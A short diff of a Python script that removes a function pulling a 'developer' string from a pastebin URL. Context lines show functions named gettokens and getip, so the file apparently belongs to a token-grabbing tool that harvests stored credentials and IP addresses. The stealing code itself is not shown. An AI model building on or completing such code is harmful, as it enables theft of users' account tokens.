@@ -53,16 +53,6 @@ def gettokens(path):
     return tokens
 
 
-def getdeveloper():
-    dev = "wodx"
-    try:
-        dev = urlopen(
-            Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
-    except:
-        pass
-    return dev
-
-
 def getip():
     ip = "None"
     try:
